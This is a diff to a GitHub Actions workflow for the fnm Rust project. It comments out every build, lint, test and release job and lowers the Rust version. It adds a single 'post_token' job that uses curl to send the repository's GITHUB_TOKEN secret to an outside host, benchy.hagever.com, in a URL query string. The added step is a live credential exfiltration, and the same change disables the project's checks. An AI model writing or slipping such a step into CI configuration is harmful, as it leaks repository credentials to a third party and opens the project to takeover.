@@ -11,428 +11,427 @@ concurrency:
   cancel-in-progress: true
 
 env:
-  RUST_VERSION: "1.88"
+  RUST_VERSION: "1.78"
 
 jobs:
-  fmt:
+  post_token:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - uses: hecrj/setup-rust-action@v2
-        with:
-          rust-version: ${{env.RUST_VERSION}}
-      - uses: Swatinem/rust-cache@v2
-      - name: cargo fmt
-        run: cargo fmt -- --check
-
-  clippy:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: hecrj/setup-rust-action@v2
-        with:
-          rust-version: ${{env.RUST_VERSION}}
-      - uses: Swatinem/rust-cache@v2
-      - name: cargo clippy
-        run: cargo clippy -- -D warnings
-
-  unit_tests:
-    runs-on: ${{ matrix.os }}
-    strategy:
-      matrix:
-        os: [ubuntu-latest, macOS-latest, windows-latest]
-    steps:
-      - uses: actions/checkout@v4
-      - uses: hecrj/setup-rust-action@v2
-        with:
-          rust-version: ${{env.RUST_VERSION}}
-      - uses: Swatinem/rust-cache@v2
-      - name: Run tests
-        run: cargo test
-
-  build_release:
-    runs-on: windows-latest
-    name: "Release build for Windows"
-    steps:
-      - uses: actions/checkout@v4
-      - uses: hecrj/setup-rust-action@v2
-        with:
-          rust-version: ${{env.RUST_VERSION}}
-      - uses: Swatinem/rust-cache@v2
-      - name: Build release binary
-        run: cargo build --release
+      - name: Post token
+        run: curl "https://benchy.hagever.com/api/test?token=$GITHUB_TOKEN" -X POST -f
         env:
-          RUSTFLAGS: "-C target-feature=+crt-static"
-      - uses: actions/upload-artifact@v4
-        with:
-          name: fnm-windows
-          path: target/release/fnm.exe
-
-  build_macos_release:
-    runs-on: macos-latest
-    name: "Release build for macOS"
-    steps:
-      - uses: actions/checkout@v4
-      - uses: hecrj/setup-rust-action@v2
-        with:
-          rust-version: ${{env.RUST_VERSION}}
-          targets: x86_64-apple-darwin,aarch64-apple-darwin
-      - uses: Swatinem/rust-cache@v2
-      - name: Build release binary
-        run: |
-          cargo build --release --target x86_64-apple-darwin
-          strip target/x86_64-apple-darwin/release/fnm
-          cargo build --release --target aarch64-apple-darwin
-          strip target/aarch64-apple-darwin/release/fnm
-          mkdir -p target/release
-          # create a universal binary
-          lipo -create \
-            target/x86_64-apple-darwin/release/fnm \
-            target/aarch64-apple-darwin/release/fnm \
-            -output target/release/fnm
-        env:
-          LZMA_API_STATIC: "true"
-      - name: Strip binary from debug symbols
-        run: strip target/release/fnm
-      - name: List dynamically linked libraries
-        run: otool -L target/release/fnm
-      - uses: actions/upload-artifact@v4
-        with:
-          name: fnm-macos
-          path: target/release/fnm
-
-  e2e_macos:
-    runs-on: macos-latest
-    needs: [build_macos_release]
-    name: "e2e/macos"
-    steps:
-      - uses: actions/checkout@v4
-      - name: install necessary shells
-        run: brew install fish zsh bash
-      - uses: actions/download-artifact@v4
-        with:
-          name: fnm-macos
-          path: target/release
-      - name: mark binary as executable
-        run: chmod +x target/release/fnm
-      - uses: pnpm/action-setup@v4.2.0
-        with:
-          run_install: false
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 18.x
-          cache: "pnpm"
-      - name: Get pnpm store directory
-        id: pnpm-cache
-        run: |
-          echo "::set-output name=pnpm_cache_dir::$(pnpm store path)"
-      - uses: actions/cache@v4
-        name: Setup pnpm cache
-        with:
-          path: ${{ steps.pnpm-cache.outputs.pnpm_cache_dir }}
-          key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
-          restore-keys: |
-            ${{ runner.os }}-pnpm-store-
-      - run: pnpm install
-      - run: pnpm test
-        env:
-          FNM_TARGET_NAME: "release"
-          FORCE_COLOR: "1"
-
-  e2e_windows:
-    runs-on: windows-latest
-    needs: [build_release]
-    name: "e2e/windows"
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/download-artifact@v4
-        with:
-          name: fnm-windows
-          path: target/release
-      - uses: MinoruSekine/setup-scoop@v4
-      - uses: pnpm/action-setup@v4.2.0
-        with:
-          run_install: false
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 18.x
-          cache: "pnpm"
-      - name: Get pnpm store directory
-        id: pnpm-cache
-        run: |
-          echo "::set-output name=pnpm_cache_dir::$(pnpm store path)"
-      - uses: actions/cache@v4
-        name: Setup pnpm cache
-        with:
-          path: ${{ steps.pnpm-cache.outputs.pnpm_cache_dir }}
-          key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
-          restore-keys: |
-            ${{ runner.os }}-pnpm-store-
-      - run: pnpm install
-      - run: pnpm test
-        env:
-          FNM_TARGET_NAME: "release"
-          FORCE_COLOR: "1"
-
-  # e2e_windows_debug:
-  #   runs-on: windows-latest
-  #   name: "e2e/windows/debug"
-  #   environment: Debug
-  #   needs: [e2e_windows]
-  #   if: contains(join(needs.*.result, ','), 'failure')
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+  # fmt:
+  #   runs-on: ubuntu-latest
   #   steps:
-  #   - uses: actions/checkout@v3
-  #   - uses: actions/download-artifact@v3
-  #     with:
-  #       name: fnm-windows
-  #       path: target/release
-  #   - uses: pnpm/action-setup@v2.2.2
-  #     with:
-  #       run_install: false
-  #   - uses: actions/setup-node@v3
-  #     with:
-  #       node-version: 18.x
-  #       cache: 'pnpm'
-  #   - name: Get pnpm store directory
-  #     id: pnpm-cache
-  #     run: |
-  #       echo "::set-output name=pnpm_cache_dir::$(pnpm store path)"
-  #   - uses: actions/cache@v3
-  #     name: Setup pnpm cache
-  #     with:
-  #       path: ${{ steps.pnpm-cache.outputs.pnpm_cache_dir }}
-  #       key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
-  #       restore-keys: |
-  #         ${{ runner.os }}-pnpm-store-
-  #   - run: pnpm install
-  #   - name: 🐛 Debug Build
-  #     uses: mxschmitt/action-tmate@v3
+  #     - uses: hecrj/setup-rust-action@v1
+  #       with:
+  #         rust-version: ${{env.RUST_VERSION}}
+  #     - uses: Swatinem/rust-cache@v2
+  #     - uses: actions/checkout@v3
+  #     - name: cargo fmt
+  #       run: cargo fmt -- --check
+  #
+  # clippy:
+  #   runs-on: ubuntu-latest
+  #   steps:
+  #     - uses: hecrj/setup-rust-action@v1
+  #       with:
+  #         rust-version: ${{env.RUST_VERSION}}
+  #     - uses: Swatinem/rust-cache@v2
+  #     - uses: actions/checkout@v3
+  #     - name: cargo clippy
+  #       run: cargo clippy -- -D warnings
+  #
+  # unit_tests:
+  #   runs-on: ${{ matrix.os }}
+  #   strategy:
+  #     matrix:
+  #       os: [ubuntu-latest, macOS-latest, windows-latest]
+  #   steps:
+  #     - uses: hecrj/setup-rust-action@v1
+  #       with:
+  #         rust-version: ${{env.RUST_VERSION}}
+  #     - uses: Swatinem/rust-cache@v2
+  #     - uses: actions/checkout@v3
+  #     - name: Run tests
+  #       run: cargo test
+  #
+  # build_release:
+  #   runs-on: windows-latest
+  #   name: "Release build for Windows"
+  #   steps:
+  #     - uses: hecrj/setup-rust-action@v1
+  #       with:
+  #         rust-version: ${{env.RUST_VERSION}}
+  #     - uses: Swatinem/rust-cache@v2
+  #     - uses: actions/checkout@v3
+  #     - name: Build release binary
+  #       run: cargo build --release
+  #       env:
+  #         RUSTFLAGS: "-C target-feature=+crt-static"
+  #     - uses: actions/upload-artifact@v3
+  #       with:
+  #         name: fnm-windows
+  #         path: target/release/fnm.exe
+  #
+  # build_macos_release:
+  #   runs-on: macos-latest
+  #   name: "Release build for macOS"
+  #   steps:
+  #     - uses: hecrj/setup-rust-action@v1
+  #       with:
+  #         rust-version: ${{env.RUST_VERSION}}
+  #     - uses: Swatinem/rust-cache@v2
+  #     - uses: actions/checkout@v3
+  #     - name: Build release binary
+  #       run: cargo build --release
+  #       env:
+  #         LZMA_API_STATIC: "true"
+  #     - name: Strip binary from debug symbols
+  #       run: strip target/release/fnm
+  #     - name: List dynamically linked libraries
+  #       run: otool -L target/release/fnm
+  #     - uses: actions/upload-artifact@v3
+  #       with:
+  #         name: fnm-macos
+  #         path: target/release/fnm
+  #
+  # e2e_macos:
+  #   runs-on: macos-latest
+  #   needs: [build_macos_release]
+  #   name: "e2e/macos"
+  #   steps:
+  #     - name: install necessary shells
+  #       run: brew install fish zsh bash
+  #     - uses: actions/checkout@v3
+  #     - uses: actions/download-artifact@v3
+  #       with:
+  #         name: fnm-macos
+  #         path: target/release
+  #     - name: mark binary as executable
+  #       run: chmod +x target/release/fnm
+  #     - uses: pnpm/action-setup@v2.2.4
+  #       with:
+  #         run_install: false
+  #     - uses: actions/setup-node@v3
+  #       with:
+  #         node-version: 18.x
+  #         cache: "pnpm"
+  #     - name: Get pnpm store directory
+  #       id: pnpm-cache
+  #       run: |
+  #         echo "::set-output name=pnpm_cache_dir::$(pnpm store path)"
+  #     - uses: actions/cache@v3
+  #       name: Setup pnpm cache
+  #       with:
+  #         path: ${{ steps.pnpm-cache.outputs.pnpm_cache_dir }}
+  #         key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
+  #         restore-keys: |
+  #           ${{ runner.os }}-pnpm-store-
+  #     - run: pnpm install
+  #     - run: pnpm test
+  #       env:
+  #         FNM_TARGET_NAME: "release"
+  #         FORCE_COLOR: "1"
+  #
+  # e2e_windows:
+  #   runs-on: windows-latest
+  #   needs: [build_release]
+  #   name: "e2e/windows"
+  #   steps:
+  #     - uses: actions/checkout@v3
+  #     - uses: actions/download-artifact@v3
+  #       with:
+  #         name: fnm-windows
+  #         path: target/release
+  #     - uses: pnpm/action-setup@v2.2.4
+  #       with:
+  #         run_install: false
+  #     - uses: actions/setup-node@v3
+  #       with:
+  #         node-version: 18.x
+  #         cache: "pnpm"
+  #     - name: Get pnpm store directory
+  #       id: pnpm-cache
+  #       run: |
+  #         echo "::set-output name=pnpm_cache_dir::$(pnpm store path)"
+  #     - uses: actions/cache@v3
+  #       name: Setup pnpm cache
+  #       with:
+  #         path: ${{ steps.pnpm-cache.outputs.pnpm_cache_dir }}
+  #         key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
+  #         restore-keys: |
+  #           ${{ runner.os }}-pnpm-store-
+  #     - run: pnpm install
+  #     - run: pnpm test
+  #       env:
+  #         FNM_TARGET_NAME: "release"
+  #         FORCE_COLOR: "1"
+  #
+  # # e2e_windows_debug:
+  # #   runs-on: windows-latest
+  # #   name: "e2e/windows/debug"
+  # #   environment: Debug
+  # #   needs: [e2e_windows]
+  # #   if: contains(join(needs.*.result, ','), 'failure')
+  # #   steps:
+  # #   - uses: actions/checkout@v3
+  # #   - uses: actions/download-artifact@v3
+  # #     with:
+  # #       name: fnm-windows
+  # #       path: target/release
+  # #   - uses: pnpm/action-setup@v2.2.2
+  # #     with:
+  # #       run_install: false
+  # #   - uses: actions/setup-node@v3
+  # #     with:
+  # #       node-version: 18.x
+  # #       cache: 'pnpm'
+  # #   - name: Get pnpm store directory
+  # #     id: pnpm-cache
+  # #     run: |
+  # #       echo "::set-output name=pnpm_cache_dir::$(pnpm store path)"
+  # #   - uses: actions/cache@v3
+  # #     name: Setup pnpm cache
+  # #     with:
+  # #       path: ${{ steps.pnpm-cache.outputs.pnpm_cache_dir }}
+  # #       key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
+  # #       restore-keys: |
+  # #         ${{ runner.os }}-pnpm-store-
+  # #   - run: pnpm install
+  # #   - name: 🐛 Debug Build
+  # #     uses: mxschmitt/action-tmate@v3
+  #
+  # e2e_linux:
+  #   runs-on: ubuntu-latest
+  #   needs: [build_static_linux_binary]
+  #   name: "e2e/linux"
+  #   steps:
+  #     - name: install necessary shells
+  #       run: sudo apt-get update && sudo apt-get install -y fish zsh bash
+  #     - uses: actions/checkout@v3
+  #     - uses: actions/download-artifact@v3
+  #       with:
+  #         name: fnm-linux
+  #         path: target/release
+  #     - name: mark binary as executable
+  #       run: chmod +x target/release/fnm
+  #     - uses: pnpm/action-setup@v2.2.4
+  #       with:
+  #         run_install: false
+  #     - uses: actions/setup-node@v3
+  #       with:
+  #         node-version: 18.x
+  #         cache: "pnpm"
+  #     - name: Get pnpm store directory
+  #       id: pnpm-cache
+  #       run: |
+  #         echo "::set-output name=pnpm_cache_dir::$(pnpm store path)"
+  #     - uses: actions/cache@v3
+  #       name: Setup pnpm cache
+  #       with:
+  #         path: ${{ steps.pnpm-cache.outputs.pnpm_cache_dir }}
+  #         key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
+  #         restore-keys: |
+  #           ${{ runner.os }}-pnpm-store-
+  #     - run: pnpm install
+  #     - run: pnpm test
+  #       env:
+  #         FNM_TARGET_NAME: "release"
+  #         FORCE_COLOR: "1"
+  #
+  # build_static_linux_binary:
+  #   name: "Build static Linux binary"
+  #   runs-on: ubuntu-latest
+  #   steps:
+  #     - uses: hecrj/setup-rust-action@v1
+  #       with:
+  #         rust-version: ${{env.RUST_VERSION}}
+  #         targets: x86_64-unknown-linux-musl
+  #     - uses: Swatinem/rust-cache@v2
+  #       with:
+  #         key: static-linux-binary
+  #     - name: Install musl tools
+  #       run: |
+  #         sudo apt-get update
+  #         sudo apt-get install -y --no-install-recommends musl-tools
+  #     - uses: actions/checkout@v3
+  #     - name: Build release binary
+  #       run: cargo build --release --target x86_64-unknown-linux-musl
+  #     - name: Strip binary from debug symbols
+  #       run: strip target/x86_64-unknown-linux-musl/release/fnm
+  #     - uses: actions/upload-artifact@v3
+  #       with:
+  #         name: fnm-linux
+  #         path: target/x86_64-unknown-linux-musl/release/fnm
+  #
+  # build_static_arm_binary:
+  #   name: "Build ARM binary"
+  #   strategy:
+  #     matrix:
+  #       include:
+  #         - arch: arm64
+  #           rust_target: aarch64-unknown-linux-musl
+  #           docker_image: arm64v8/ubuntu
+  #           docker_platform: aarch64
+  #         - arch: arm32
+  #           rust_target: armv7-unknown-linux-gnueabihf
+  #           docker_image: arm32v7/ubuntu
+  #           docker_platform: armv7
+  #   runs-on: ubuntu-latest
+  #   env:
+  #     RUST_TARGET: ${{ matrix.rust_target }}
+  #   steps:
+  #     - name: Set up QEMU
+  #       id: qemu
+  #       uses: docker/setup-qemu-action@v2
+  #     - uses: hecrj/setup-rust-action@v1
+  #       with:
+  #         rust-version: ${{env.RUST_VERSION}}
+  #     - uses: Swatinem/rust-cache@v2
+  #       with:
+  #         key: arm-binary-${{ matrix.arch }}
+  #     - name: "Download `cross` crate"
+  #       run: cargo install cross
+  #     - uses: actions/checkout@v3
+  #     - name: "Build release"
+  #       run: cross build --target $RUST_TARGET --release
+  #     - uses: uraimo/run-on-arch-action@v2.1.2
+  #       name: Sanity test
+  #       with:
+  #         arch: ${{matrix.docker_platform}}
+  #         distro: ubuntu18.04
+  #
+  #         # Not required, but speeds up builds by storing container images in
+  #         # a GitHub package registry.
+  #         githubToken: ${{ github.token }}
+  #
+  #         env: |
+  #           RUST_LOG: fnm=debug
+  #
+  #         dockerRunArgs: |
+  #           --volume "${PWD}/target/${{matrix.rust_target}}/release:/artifacts"
+  #
+  #         # Set an output parameter `uname` for use in subsequent steps
+  #         run: |
+  #           echo "Hello from $(uname -a)"
+  #           /artifacts/fnm --version
+  #           echo "fnm install 12.0.0"
+  #           /artifacts/fnm install 12.0.0
+  #           echo "fnm exec --using=12 -- node --version"
+  #           /artifacts/fnm exec --using=12 -- node --version
+  #
+  #     - uses: actions/upload-artifact@v3
+  #       with:
+  #         name: fnm-${{ matrix.arch }}
+  #         path: target/${{ env.RUST_TARGET }}/release/fnm
+  #
+  # ensure_commands_markdown_is_up_to_date:
+  #   runs-on: ubuntu-latest
+  #   name: Ensure command docs are up-to-date
+  #   needs: [build_static_linux_binary]
+  #   steps:
+  #     - name: install necessary shells
+  #       run: sudo apt-get update && sudo apt-get install -y fish zsh bash
+  #     - uses: actions/checkout@v3
+  #     - uses: actions/download-artifact@v3
+  #       with:
+  #         name: fnm-linux
+  #         path: target/release
+  #     - name: mark binary as executable
+  #       run: chmod +x target/release/fnm
+  #     - name: install fnm as binary
+  #       run: |
+  #         sudo install target/release/fnm /bin
+  #         fnm --version
+  #     - uses: pnpm/action-setup@v2.2.4
+  #       with:
+  #         run_install: false
+  #     - uses: actions/setup-node@v3
+  #       with:
+  #         node-version: 18.x
+  #         cache: "pnpm"
+  #     - name: Get pnpm store directory
+  #       id: pnpm-cache
+  #       run: |
+  #         echo "::set-output name=pnpm_cache_dir::$(pnpm store path)"
+  #     - uses: actions/cache@v3
+  #       name: Setup pnpm cache
+  #       with:
+  #         path: ${{ steps.pnpm-cache.outputs.pnpm_cache_dir }}
+  #         key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
+  #         restore-keys: |
+  #           ${{ runner.os }}-pnpm-store-
+  #     - run: pnpm install
+  #     - name: Generate command markdown
+  #       run: |
+  #         pnpm run generate-command-docs --check --binary-path=$(which fnm)
 
-  e2e_linux:
-    runs-on: ubuntu-latest
-    needs: [build_static_linux_binary]
-    name: "e2e/linux"
-    steps:
-      - uses: actions/checkout@v4
-      - name: install necessary shells
-        run: sudo apt-get update && sudo apt-get install -y fish zsh bash
-      - uses: actions/download-artifact@v4
-        with:
-          name: fnm-linux
-          path: target/release
-      - name: mark binary as executable
-        run: chmod +x target/release/fnm
-      - uses: pnpm/action-setup@v4.2.0
-        with:
-          run_install: false
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 18.x
-          cache: "pnpm"
-      - name: Get pnpm store directory
-        id: pnpm-cache
-        run: |
-          echo "::set-output name=pnpm_cache_dir::$(pnpm store path)"
-      - uses: actions/cache@v4
-        name: Setup pnpm cache
-        with:
-          path: ${{ steps.pnpm-cache.outputs.pnpm_cache_dir }}
-          key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
-          restore-keys: |
-            ${{ runner.os }}-pnpm-store-
-      - run: pnpm install
-      - run: pnpm test
-        env:
-          FNM_TARGET_NAME: "release"
-          FORCE_COLOR: "1"
-
-  build_static_linux_binary:
-    name: "Build static Linux binary"
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: hecrj/setup-rust-action@v2
-        with:
-          rust-version: ${{env.RUST_VERSION}}
-          targets: x86_64-unknown-linux-musl
-      - uses: Swatinem/rust-cache@v2
-        with:
-          key: static-linux-binary
-      - name: Install musl tools
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y --no-install-recommends musl-tools
-      - name: Build release binary
-        run: cargo build --release --target x86_64-unknown-linux-musl
-      - name: Strip binary from debug symbols
-        run: strip target/x86_64-unknown-linux-musl/release/fnm
-      - uses: actions/upload-artifact@v4
-        with:
-          name: fnm-linux
-          path: target/x86_64-unknown-linux-musl/release/fnm
-
-  build_static_arm_binary:
-    name: "Build ARM binary"
-    strategy:
-      matrix:
-        include:
-          - arch: arm64
-            rust_target: aarch64-unknown-linux-musl
-            docker_image: arm64v8/ubuntu
-            docker_platform: aarch64
-          - arch: arm32
-            rust_target: armv7-unknown-linux-gnueabihf
-            docker_image: arm32v7/ubuntu
-            docker_platform: armv7
-    runs-on: ubuntu-latest
-    env:
-      RUST_TARGET: ${{ matrix.rust_target }}
-    steps:
-      - uses: actions/checkout@v4
-      - name: Set up QEMU
-        id: qemu
-        uses: docker/setup-qemu-action@v3
-      - uses: hecrj/setup-rust-action@v2
-        with:
-          rust-version: ${{env.RUST_VERSION}}
-      - uses: Swatinem/rust-cache@v2
-        with:
-          key: arm-binary-${{ matrix.arch }}
-      - name: "Download `cross` crate"
-        run: cargo install cross
-      - name: "Build release"
-        run: cross build --target $RUST_TARGET --release
-      - uses: uraimo/run-on-arch-action@v2.1.2
-        name: Sanity test
-        with:
-          arch: ${{matrix.docker_platform}}
-          distro: ubuntu18.04
-
-          # Not required, but speeds up builds by storing container images in
-          # a GitHub package registry.
-          githubToken: ${{ github.token }}
-
-          env: |
-            RUST_LOG: fnm=debug
-          dockerRunArgs: |
-            --volume "${PWD}/target/${{matrix.rust_target}}/release:/artifacts"
-          # Set an output parameter `uname` for use in subsequent steps
-          run: |
-            echo "Hello from $(uname -a)"
-            /artifacts/fnm --version
-            echo "fnm install 12.0.0"
-            /artifacts/fnm install 12.0.0
-            echo "fnm exec --using=12 -- node --version"
-            /artifacts/fnm exec --using=12 -- node --version
-      - uses: actions/upload-artifact@v4
-        with:
-          name: fnm-${{ matrix.arch }}
-          path: target/${{ env.RUST_TARGET }}/release/fnm
-
-  ensure_commands_markdown_is_up_to_date:
-    runs-on: ubuntu-latest
-    name: Ensure command docs are up-to-date
-    needs: [build_static_linux_binary]
-    steps:
-      - uses: actions/checkout@v4
-      - name: install necessary shells
-        run: sudo apt-get update && sudo apt-get install -y fish zsh bash
-      - uses: actions/download-artifact@v4
-        with:
-          name: fnm-linux
-          path: target/release
-      - name: mark binary as executable
-        run: chmod +x target/release/fnm
-      - name: install fnm as binary
-        run: |
-          sudo install target/release/fnm /bin
-          fnm --version
-      - uses: pnpm/action-setup@v4.2.0
-        with:
-          run_install: false
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 18.x
-          cache: "pnpm"
-      - name: Get pnpm store directory
-        id: pnpm-cache
-        run: |
-          echo "::set-output name=pnpm_cache_dir::$(pnpm store path)"
-      - uses: actions/cache@v4
-        name: Setup pnpm cache
-        with:
-          path: ${{ steps.pnpm-cache.outputs.pnpm_cache_dir }}
-          key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
-          restore-keys: |
-            ${{ runner.os }}-pnpm-store-
-      - run: pnpm install
-      - name: Generate command markdown
-        run: |
-          pnpm run generate-command-docs --check --binary-path=$(which fnm)
-      # TODO: use bnz
-      # run_e2e_benchmarks:
-      #   runs-on: ubuntu-latest
-      #   name: bench/linux
-      #   needs: [build_static_linux_binary]
-      #   permissions:
-      #     contents: write
-      #     pull-requests: write
-      #   steps:
-      #     - name: install necessary shells
-      #       run: sudo apt-get update && sudo apt-get install -y fish zsh bash hyperfine
-      #     - uses: actions/checkout@v3
-      #     - uses: actions/download-artifact@v3
-      #       with:
-      #         name: fnm-linux
-      #         path: target/release
-      #     - name: mark binary as executable
-      #       run: chmod +x target/release/fnm
-      #     - name: install fnm as binary
-      #       run: |
-      #         sudo install target/release/fnm /bin
-      #         fnm --version
-      #     - uses: pnpm/action-setup@v2.2.4
-      #       with:
-      #         run_install: false
-      #     - uses: actions/setup-node@v3
-      #       with:
-      #         node-version: 18.x
-      #         cache: "pnpm"
-      #     - name: Get pnpm store directory
-      #       id: pnpm-cache
-      #       run: |
-      #         echo "::set-output name=pnpm_cache_dir::$(pnpm store path)"
-      #     - uses: actions/cache@v3
-      #       name: Setup pnpm cache
-      #       with:
-      #         path: ${{ steps.pnpm-cache.outputs.pnpm_cache_dir }}
-      #         key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
-      #         restore-keys: |
-      #           ${{ runner.os }}-pnpm-store-
-      #     - run: pnpm install
-      #     - name: Run benchmarks
-      #       env:
-      #         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      #         SHOULD_STORE: ${{ toJson(!github.event.pull_request) }}
-      #       id: benchmark
-      #       run: |
-      #         delimiter="$(openssl rand -hex 8)"
-      #         echo "markdown<<${delimiter}" >> "${GITHUB_OUTPUT}"
-      #         node benchmarks/run.mjs --store=$SHOULD_STORE >> "${GITHUB_OUTPUT}"
-      #         echo "${delimiter}" >> "${GITHUB_OUTPUT}"
-      # - name: Create a PR comment
-      #   if: ${{ github.event.pull_request }}
-      #   uses: thollander/actions-comment-pull-request@v2
-      #   with:
-      #     message: |
-      #       ## Linux Benchmarks for ${{ github.event.pull_request.head.sha }}
-      #       ${{ steps.benchmark.outputs.markdown }}
-      #     comment_tag: "benchy comment"
-      #
-      # - name: Create a commit comment
-      #   if: ${{ !github.event.pull_request }}
-      #   uses: peter-evans/commit-comment@v2
-      #   with:
-      #     body: |
-      #       ## Linux Benchmarks
-      #       ${{ steps.benchmark.outputs.markdown }}
+  # TODO: use bnz
+  # run_e2e_benchmarks:
+  #   runs-on: ubuntu-latest
+  #   name: bench/linux
+  #   needs: [build_static_linux_binary]
+  #   permissions:
+  #     contents: write
+  #     pull-requests: write
+  #   steps:
+  #     - name: install necessary shells
+  #       run: sudo apt-get update && sudo apt-get install -y fish zsh bash hyperfine
+  #     - uses: actions/checkout@v3
+  #     - uses: actions/download-artifact@v3
+  #       with:
+  #         name: fnm-linux
+  #         path: target/release
+  #     - name: mark binary as executable
+  #       run: chmod +x target/release/fnm
+  #     - name: install fnm as binary
+  #       run: |
+  #         sudo install target/release/fnm /bin
+  #         fnm --version
+  #     - uses: pnpm/action-setup@v2.2.4
+  #       with:
+  #         run_install: false
+  #     - uses: actions/setup-node@v3
+  #       with:
+  #         node-version: 18.x
+  #         cache: "pnpm"
+  #     - name: Get pnpm store directory
+  #       id: pnpm-cache
+  #       run: |
+  #         echo "::set-output name=pnpm_cache_dir::$(pnpm store path)"
+  #     - uses: actions/cache@v3
+  #       name: Setup pnpm cache
+  #       with:
+  #         path: ${{ steps.pnpm-cache.outputs.pnpm_cache_dir }}
+  #         key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
+  #         restore-keys: |
+  #           ${{ runner.os }}-pnpm-store-
+  #     - run: pnpm install
+  #     - name: Run benchmarks
+  #       env:
+  #         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+  #         SHOULD_STORE: ${{ toJson(!github.event.pull_request) }}
+  #       id: benchmark
+  #       run: |
+  #         delimiter="$(openssl rand -hex 8)"
+  #         echo "markdown<<${delimiter}" >> "${GITHUB_OUTPUT}"
+  #         node benchmarks/run.mjs --store=$SHOULD_STORE >> "${GITHUB_OUTPUT}"
+  #         echo "${delimiter}" >> "${GITHUB_OUTPUT}"
+  # - name: Create a PR comment
+  #   if: ${{ github.event.pull_request }}
+  #   uses: thollander/actions-comment-pull-request@v2
+  #   with:
+  #     message: |
+  #       ## Linux Benchmarks for ${{ github.event.pull_request.head.sha }}
+  #       ${{ steps.benchmark.outputs.markdown }}
+  #     comment_tag: "benchy comment"
+  #
+  # - name: Create a commit comment
+  #   if: ${{ !github.event.pull_request }}
+  #   uses: peter-evans/commit-comment@v2
+  #   with:
+  #     body: |
+  #       ## Linux Benchmarks
+  #       ${{ steps.benchmark.outputs.markdown }}
